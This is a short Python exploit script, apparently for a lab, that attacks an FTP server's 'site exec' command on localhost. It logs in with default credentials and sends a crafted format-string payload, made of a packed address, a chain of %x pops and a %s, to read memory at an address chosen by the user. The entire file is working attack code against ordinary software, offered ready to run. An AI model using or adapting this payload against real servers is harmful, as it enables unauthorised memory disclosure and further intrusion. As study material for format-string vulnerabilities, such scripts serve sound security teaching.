#!/usr/bin/env python3

import sys
import socket
import struct

POPS = 21
PAD_BYTES = 2
RETURN_ADDR_LOC = 0xffff947e

def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def craft_exploit_string(pops, pad_bytes, addr):
    exploit_str = pad_bytes * b'a'
    exploit_str += struct.pack('<I', addr).replace(b'\xff', b'\xff\xff')
    exploit_str += b'cccc'
    exploit_str += b'%x' * pops
    exploit_str += b'str:'
    exploit_str += b'%s'
    return exploit_str


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    return s.recv(9000)


def exploit(s, addr):
    banner(s)
    login(s)
    exploit_str = craft_exploit_string(POPS, PAD_BYTES, addr)
    print(f'[*] Exploit crafted:')
    print(exploit_str)
    response = site_exec(s, exploit_str)
    print(response)
    if response:
        response = response.split(b'\r\n')[0]
        if b'str:' in response:
            response = response.split(b'str:')[1]
            print(f'\n[+] Found string at {hex(addr)}:')
            print(response)
        else:
            print(f'\n[-] Could not get string at {hex(addr)}')
    else:
        print(f'\n[-] Server could not handle request')


def main():
    if len(sys.argv) < 2:
        print(f'[*] Usage {sys.argv[0]}')
        exit(1)
    addr = int(sys.argv[1], 16)

    with socket.socket() as s:
        s.connect(('localhost', 21))
        exploit(s, addr)


if __name__ == '__main__':
    main()
